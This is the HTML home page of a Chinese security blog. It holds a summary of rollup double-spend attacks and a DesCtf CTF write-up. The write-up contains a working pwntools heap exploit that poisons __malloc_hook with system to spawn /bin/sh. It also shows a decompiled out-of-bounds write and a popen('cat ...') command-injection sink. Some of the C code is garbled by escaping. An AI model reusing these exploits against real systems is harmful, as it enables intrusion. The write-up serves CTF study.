@@ -1,0 +1,4745 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div
+        id="home-background"
+        ref="homeBackground"
+        data-images="/images/background.jpg"
+    ></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>良夜の小窝</h1>
+                <h3>良夜の小窝</h3>
+                <h5>Here&#39;s an cat...</h5>
+            </div>
+        </span>
+    </div>
+</div>
+<div
+    id="home-posts-wrap"
+    ref="homePostsWrap"
+    true
+>
+    <div id="home-posts">
+        
+
+<div class="post">
+    <a href="/2025/08/05/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%BE%91/">
+        <h2 class="post-title">测试文章自动编辑</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/5
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="脚本生效成功"><a href="#脚本生效成功" class="headerlink" title="脚本生效成功"></a>脚本生效成功</h1><p>内容体</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2025/08/05/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%BE%91/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/08/04/hello-world/">
+        <h2 class="post-title">Hello World</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="language-bash">$ hexo new &quot;My New Post&quot;
+</code></pre>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="language-bash">$ hexo server
+</code></pre>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="language-bash">$ hexo generate
+</code></pre>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="language-bash">$ hexo deploy
+</code></pre>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2025/08/04/hello-world/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/08/04/test/">
+        <h2 class="post-title">test</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><p>hello this my test post</p>
+<h2 id="这是一个二级标题"><a href="#这是一个二级标题" class="headerlink" title="这是一个二级标题"></a>这是一个二级标题</h2><p>这是内容</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2025/08/04/test/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/08/03/Rollup-Soft-Finality/">
+        <h2 class="post-title">知识点：Rollup Soft Finality 回滚导致的跨链双花</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                区块链安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/3
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>知识点：Rollup Soft Finality 回滚导致的跨链双花</p>
+<ol>
+<li><p>背景<br>论文 《DoubleUp Roll: Double-spending in Arbitrum by Rolling It Back》 研究的是 Optimistic Rollup 中一种很典型的漏洞模式：跨链应用过早相信 L2 的 soft finality，导致源链交易后来被回滚，但目标链资产已经发放，从而形成双花。 论文中作者披露了 Arbitrum 上三类双花攻击，并说明部分攻击思路也能迁移到 Optimism；这些问题已在 2022–2023 年报告给 Arbitrum 和 Optimism 团队并修复。<br>这个知识点的关键不是“传统 51% 攻击”，而是 Rollup 状态机和跨链桥状态机之间的确认语义不一致。</p>
+</li>
+<li><p>核心概念：soft finality vs hard finality<br>在 Optimistic Rollup 中，一笔 L2 交易通常会经历两个阶段：<br>其中：<br>Soft Finality<br>交易已经被 L2 sequencer 执行，用户和应用可以看到交易成功。<br>但是，这个状态还不是最终状态，后续仍可能因为 L1&#x2F;L2 同步、batch invalid、强制包含、时间戳修正等原因被回滚。<br>Hard Finality<br>交易数据已经被提交到 L1，并获得 L1 层面的确认。<br>这时交易结果才更接近真正不可逆。</p>
+</li>
+<li><p>漏洞本质<br>这类漏洞可以总结成一句话：<br>抽象流程如下：<br>所以，漏洞点不是单个 Solidity 函数里的 transfer，而是整个跨链系统的状态机假设错了：</p>
+</li>
+<li><p>三类攻击<br>4.1 Overtime Attack：利用时间边界触发回滚<br>Arbitrum 有时间边界机制，用于限制 L2 时间戳和 L1 时间戳之间的偏移。论文的攻击思路是：先制造 L2 到 L1 的提交延迟，使某些交易长时间停留在 soft-finalized 状态；当延迟超过时间边界后，系统修正时间戳，导致 soft-finalized 状态和 hard-finalized 状态不一致，进而触发 rollback。<br>可以抽象成：<br>出题关键词：<br>应该重点检查：</p>
+</li>
+</ol>
+<p>4.2 QueueCut Attack：利用 Force Inclusion 改变交易顺序<br>Rollup 为了抗审查，会允许用户绕过 sequencer，直接从 L1 提交 L1→L2 消息。等待窗口结束后，用户可以调用 force inclusion，让消息强制进入 L2。Arbitrum 文档中也描述了 Delayed Inbox 和 forceInclude 的流程：如果 sequencer 没有处理交易，等待后可以调用 forceInclude 保证包含。<br>论文中的 QueueCut Attack 利用的就是这个机制：攻击者先制造延迟，让某些 L2 soft-finalized 交易还没提交到 L1；然后通过 L1→L2 强制包含消息改变 canonical queue，导致 L2 原先的 soft queue 和最终 L1 hard queue 不一致，从而触发 rollback。<br>可以写成：<br>典型合约接口可能长这样：</p>
+<p>4.3 Zip-Bomb Attack：压缩前后大小检查不一致<br>Arbitrum 当时的 transaction compression &#x2F; decompression 机制存在不一致：解压阶段有 size-bound check，但压缩打包阶段没有对应的明文大小检查。攻击者可以构造大量高压缩率数据，比如大量 0x00，使压缩后的 batch 很小，但解压后超过上限。L2 节点从 L1 读取 batch 后解压，发现超限，于是判定 batch invalid，导致 soft-finalized 交易回滚。<br>通常会变成：<br>攻击 payload：<br>因为大量 0 极易压缩，所以：<br>最终目标不是单纯 DoS，而是让系统进入：<br>可能常见 flag 条件：<br>意思是：玩家在目标链拿到了钱，同时源链的钱也没少。</p>
+<ol start="5">
+<li>可能的CTF 解题 checklist<br>遇到 Rollup &#x2F; Bridge &#x2F; L2 &#x2F; Cross-chain 题，优先看下面几点。<br>5.1 桥是不是过早确认？<br>危险代码：<br>更安全的逻辑应该类似：<br>如果题目里只有 executed、confirmed、relayed，但没有 finalized，要高度怀疑。</li>
+</ol>
+<p>5.2 是否存在 rollback 分支？<br>搜这些函数名：<br>如果系统里有 rollback，但桥的状态没有一起撤销，就可能形成双花。</p>
+<p>5.3 是否存在双队列？<br>重点观察：<br>漏洞通常出现在：</p>
+<p>5.4 是否存在压缩 &#x2F; 解压不一致？<br>危险模式：<br>这种题目通常是 Zip-Bomb 方向。</p>
+<p>5.5 是否存在跨链状态未同步撤销？<br>错误状态机：<br>如果 RolledBack 后没有把 Minted 撤销，就是漏洞。<br>更完整的状态机应该考虑：</p>
+<ol start="6">
+<li><p>和普通 Bridge CTF 的区别<br>普通 Bridge CTF 常见漏洞是：<br>而 DoubleUp Roll 这篇论文对应的知识点更偏系统层：<br>也就是说，攻击者不是让桥“相信一个假事件”，而是让桥“过早相信一个之后会消失的真事件”。<br>这是它和很多普通 bridge 题的本质区别。</p>
+</li>
+<li><p>对应的公开题目参考<br>这类东西可能出题难度比较高，只找到这两个<br>Real World CTF 6th - SafeBridge<br>这个题是 Web3 &#x2F; Solidity &#x2F; Cross-chain Bridge 方向，目标是 drain L1 bridge 里的 WETH；CTFtime 页面标注了标签 blockchain bridge smart-contract，题目目标是把 L1 bridge 里的资产清空。<br>它和 DoubleUp Roll 的关系是：<br>SafeBridge 不是直接考 Arbitrum rollback &#x2F; soft finality &#x2F; hard finality，但是它和这篇论文属于同一个大类知识点：<br>跨链系统中，两边链的状态映射不一致，导致桥的记账状态和真实资产状态脱节。<br>题目链接：github.com<br>wp参考链接：1、Real World CTF 6th – SafeBridge<br>2、CTFtime.org &#x2F; Real World CTF 6th &#x2F; SafeBridge &#x2F; Writeup<br>3、CTFtime.org &#x2F; Paradigm CTF 2023 &#x2F; Hopping into Place &#x2F; Writeup<br>参考：Paradigm CTF 2023 里也有跨链桥相关 writeup，作者思路是“欺骗 bridge 认为另一条链发来了一笔跨链 ETH transfer，然后 withdraw bridge 里的资产”，适合补充练习 bridge 状态机和 cross-domain messenger 思维。<br>wp参考：1、Blockchain - Enterprise Blockchain - Chictf-Writeups<br>2、🍳 Paradigm CTF 2023 Writeups<br>3、cn-sec.com</p>
+</li>
+</ol>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #03a9f4">CTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/blockchain/" style="color: #00bcd4">blockchain</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Rollup/" style="color: #03a9f4">Rollup</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/bridge/" style="color: #ffa2c4">bridge</a>
+        </span>
+        
+    </div>
+    <a href="/2025/08/03/Rollup-Soft-Finality/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/08/02/DesCtf/">
+        <h2 class="post-title">DesCtf 比赛复现</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/2
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>一共有三道题，一道堆题目，一道随机数。一个类似于物联网的题目</p>
+<h2 id="second-chall"><a href="#second-chall" class="headerlink" title="second_chall"></a>second_chall</h2><p>需要先写一个解密脚本拿到管理员，才能开始打堆</p>
+<pre><code class="language-c">#include 
+#include 
+#include 
+#include 
+#include 
+
+// 【需要你从 IDA 提取并填入】256 字节的 S盒
+// 提取自 byte_5020
+unsigned char byte_5020[256] = &#123;
+    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
+    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
+    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
+    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
+    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
+    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
+    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
+    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
+    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
+    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
+    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
+    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
+    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
+    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
+    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
+    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D
+&#125;;
+
+// 【需要你从 IDA 提取并填入】16 字节的密钥 (原代号 qword_5120)
+// 提取自 qword_5120，已处理小端序
+unsigned char key_5120[16] = &#123;
+    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 
+    0x13, 0x37, 0xC0, 0xDE, 0xFE, 0xED, 0xFA, 0xCE
+&#125;;
+
+// 还原的加密算法
+void encrypt_token(unsigned char *a1) &#123;
+    int i;
+    unsigned char v4;
+    
+    // Pass 1: XOR and S-Box
+    for (i = 0; i &gt; 5) | (a1[i]  &lt;approx_timestamp&gt;\n&quot;, argv[0]);
+        return 1;
+    &#125;
+
+    const char *charset = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;
+    unsigned char target_cipher[16];
+    unsigned char current_plain[17];
+    unsigned char temp_buffer[16];
+    
+    // 解析目标密文
+    for (int i = 0; i &gt; &quot;, b&quot;1&quot;)
+        p.sendlineafter(b&quot;[*] Size: &quot;, str(size).encode())
+        p.recvuntil(b&quot;allocated at &quot;)
+        addr = int(p.recvuntil(b&quot; &quot;, drop=True), 16)
+        return addr
+
+    def free(idx):
+        p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;2&quot;)
+        p.sendlineafter(b&quot;[*] Index: &quot;, str(idx).encode())
+
+    def edit(idx, content):
+        p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;3&quot;)
+        p.sendlineafter(b&quot;[*] Index: &quot;, str(idx).encode())
+        p.sendafter(b&quot;[*] Content: &quot;, content)
+
+    def show(idx):
+        p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;4&quot;)
+        p.sendlineafter(b&quot;[*] Index: &quot;, str(idx).encode())
+        res = p.recvline()
+        return res
+
+    def debug_zero(addr):
+        p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;5&quot;)
+        p.sendafter(b&quot;[*] Enter debug data &quot;, p64(addr))
+
+    heap_base = add(0x18) # Index 0
+    log.success(f&quot;Heap Address leaked: &#123;hex(heap_base)&#125;&quot;)
+
+    leak_line = show(-10)
+    stdin_leak = int(leak_line.split(b&quot;at &quot;)[1].split(b&quot; &quot;)[0], 16)
+    libc.address = stdin_leak - libc.sym[&#39;_IO_2_1_stdin_&#39;]
+    
+    malloc_hook = libc.sym[&#39;__malloc_hook&#39;]
+    system_addr = libc.sym[&#39;system&#39;]
+    log.success(f&quot;Libc Base: &#123;hex(libc.address)&#125;&quot;)
+    log.info(f&quot;__malloc_hook: &#123;hex(malloc_hook)&#125;&quot;)
+
+    log.info(&quot;Allocating chunks for overlapping...&quot;)
+    chunk1_ptr = add(0x428) 
+    chunk2_ptr = add(0x18)  
+    chunk3_ptr = add(0x4F8) 
+    chunk4_ptr = add(0x18) 
+    fake_chunk_offset = 0x3F0
+    fake_chunk_addr = chunk1_ptr + fake_chunk_offset
+    
+    fake_chunk = p64(0) + p64(0x51) + p64(fake_chunk_addr) + p64(fake_chunk_addr)
+    
+    payload = b&#39;A&#39; * fake_chunk_offset + fake_chunk
+    edit(1, payload)
+
+    edit(2, b&#39;B&#39; * 16 + p64(0x50))
+    debug_zero(chunk3_ptr - 15)
+    log.info(&quot;Triggering backward consolidation...&quot;)
+    free(3) 
+    free(0)
+    free(2) 
+    add(0x448) 
+    aligned_target = malloc_hook - 8
+    target_fd = aligned_target ^ (chunk2_ptr &gt;&gt; 12) 
+
+    log.info(&quot;Poisoning Tcache...&quot;)
+    payload = b&#39;B&#39; * 0x20 + p64(0) + p64(0x21) + p64(target_fd)
+    edit(0, payload)
+    add(0x18)
+    add(0x18) 
+    
+    log.info(&quot;Writing system() to __malloc_hook...&quot;)
+    edit(3, b&#39;A&#39; * 8 + p64(system_addr))
+    
+    log.success(&quot;Exploit Complete! Triggering shell via malloc...&quot;)
+    
+    bin_sh_addr = next(libc.search(b&#39;/bin/sh&#39;))
+    p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;1&quot;)
+    p.sendlineafter(b&quot;[*] Size: &quot;, str(bin_sh_addr).encode())
+
+    p.interactive()
+</code></pre>
+<h2 id="array"><a href="#array" class="headerlink" title="array"></a>array</h2><p>漏洞代码</p>
+<pre><code class="language-c">__int64 vuln()
+&#123;
+    unsigned __int64 v1; // rbx
+    _QWORD v2[17]; // [rsp+0h] [rbp-B0h] BYREF
+    unsigned __int64 number1; // [rsp+88h] [rbp-28h] BYREF
+    unsigned __int64 number2[3]; // [rsp+90h] [rbp-20h] BYREF
+
+    puts(&quot;plz input your number1:&quot;);
+    fflush(stdout);
+    read(0, &amp;number1, 8u);
+    if ( number1  rand() % (number1 + 1) )
+            &#123;
+                puts(&quot;No!&quot;);
+            &#125;
+            else
+            &#123;
+                puts(&quot;plz input your number2:&quot;);
+                read(0, &amp;v2[number2[0] + 1], 8u);
+            &#125;
+        &#125;
+        puts(&quot;Ok&quot;);
+        return 0;
+    &#125;
+    else
+    &#123;
+        puts(&quot;No!&quot;);
+        return 0xFFFFFFFFLL;
+    &#125;
+&#125;
+</code></pre>
+<ol>
+<li>在 else 分支中，有这样一行代码：</li>
+</ol>
+<pre><code class="language-c">read(0, &amp;v2[number2[0] + 1], 8u);
+</code></pre>
+<p>number2 没有检查</p>
+<p>校验逻辑可以无限循环</p>
+<pre><code class="language-c">if ( v1 &gt; rand() % (number1 + 1) )
+</code></pre>
+<p>我们要输入22，但是22大于18。程序会退出 </p>
+<p>失败后，程序只会打印 No，并<strong>不会退出循环</strong>。因为外层还有一个while get 循环，攻击者可以不断输入数据，不断进行随机数碰撞，直到随机出的数值满足条件为止。  </p>
+<pre><code class="language-c">
+</code></pre>
+<h2 id="mqtt"><a href="#mqtt" class="headerlink" title="mqtt"></a>mqtt</h2><p>mqtt应该是物联网里面的一种通信协议</p>
+<p>前两道题比赛的时候看了一下，这道题当时没看</p>
+<p>看到了了解一下</p>
+<p>程序依赖 libpaho-mqtt3c.so.1，说明其核心通信方式是 MQTT</p>
+<p>创建mqtt客户端：</p>
+<pre><code class="language-c">rc = MQTTClient_create(&amp;client, p_tcp:__localhost:9999_1, &quot;httpclient&quot;, 1, 0);
+</code></pre>
+<p>注册函数</p>
+<pre><code class="language-c">rc = MQTTClient_setCallbacks(client, 0, connlost, msgarrvd, delivered);
+</code></pre>
+<p>http里面有一个函数，可以让我们读取flag</p>
+<pre><code class="language-c">    snprintf(src, 0x80u, &quot;cat /home/ctf/%s&quot;, s);
+    n = strlen(src);
+    memcpy(cmd, src, n);
+    if ( !strcmp(s, &quot;index_html&quot;) )
+    &#123;
+      stream = popen(cmd, &quot;r&quot;);
+</code></pre>
+<p>通过ai分析，main函数里面有限制</p>
+<pre><code class="language-c">__int64 __fastcall msgarrvd(__int64 a1, const char *a2, int a3, __int64 a4)
+&#123;
+  __int64 v5; // [rsp+0h] [rbp-80h] BYREF
+  int v6; // [rsp+Ch] [rbp-74h]
+  const char *v7; // [rsp+10h] [rbp-70h]
+  __int64 v8; // [rsp+18h] [rbp-68h]
+  __int64 v9; // [rsp+28h] [rbp-58h]
+  char s1[72]; // [rsp+30h] [rbp-50h] BYREF
+  unsigned __int64 v11; // [rsp+78h] [rbp-8h]
+
+  v8 = a1;
+  v7 = a2;
+  v6 = a3;
+  v5 = a4;
+  v11 = __readfsqword(0x28u);
+  v9 = *(_QWORD *)(a4 + 16);
+  if ( (unsigned int)__isoc99_sscanf(v9, &quot;&#123;\&quot;clientid\&quot;:\&quot;%63[^\&quot;]\&quot;,&quot;, s1) == 1 &amp;&amp; !strcmp(s1, &quot;httpclient&quot;) )
+  &#123;
+    MQTTClient_freeMessage(&amp;v5);
+    MQTTClient_free(v7);
+    return 1;
+  &#125;
+  else
+  &#123;
+    http(v9);
+    puts(&quot;Message arrived&quot;);
+    printf(&quot;     topic: %s\n&quot;, v7);
+    printf(&quot;   message: %.*s\n&quot;, *(_DWORD *)(v5 + 8), *(const char **)(v5 + 16));
+    MQTTClient_freeMessage(&amp;v5);
+    MQTTClient_free(v7);
+    return 1;
+  &#125;
+&#125;
+</code></pre>
+<blockquote>
+<h3 id="1-msgarrvd-回调函数分析（路由绕过）"><a href="#1-msgarrvd-回调函数分析（路由绕过）" class="headerlink" title="1. msgarrvd 回调函数分析（路由绕过）"></a>1. <code>msgarrvd</code> 回调函数分析（路由绕过）</h3><p>当 MQTT 客户端接收到订阅主题的消息时，会触发 <code>msgarrvd</code>。我们来看关键的参数和逻辑：</p>
+<ul>
+<li><strong>提取 Payload：</strong> 在 <code>libpaho-mqtt</code> 中，第四个参数 <code>a4</code> (被赋值给 <code>v5</code>) 是一个指向 <code>MQTTClient_message</code> 结构体的指针。<ul>
+<li><code>*(_DWORD *)(v5 + 8)</code>：对应结构体中的 <code>payloadlen</code>（消息长度）。</li>
+<li><code>*(_QWORD *)(v5 + 16)</code>（代码中的 <code>v9</code>）：对应结构体中的 <code>payload</code>（实际的消息内容指针）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>绕过 <strong><code>**sscanf**</code></strong> 过滤：</strong></p>
+</blockquote>
+<pre><code class="language-c">if ( (unsigned int)__isoc99_sscanf(v9, &quot;&#123;\&quot;clientid\&quot;:\&quot;%63[^\&quot;]\&quot;,&quot;, s1) == 1 &amp;&amp; !strcmp(s1, &quot;httpclient&quot;) )
+</code></pre>
+<blockquote>
+<p>这里程序尝试将 JSON 格式的 payload 解析出 <code>clientid</code>。如果 <code>clientid</code> 刚好是 <code>&quot;httpclient&quot;</code>，程序就会直接释放消息并返回，<strong>什么都不做</strong>。</p>
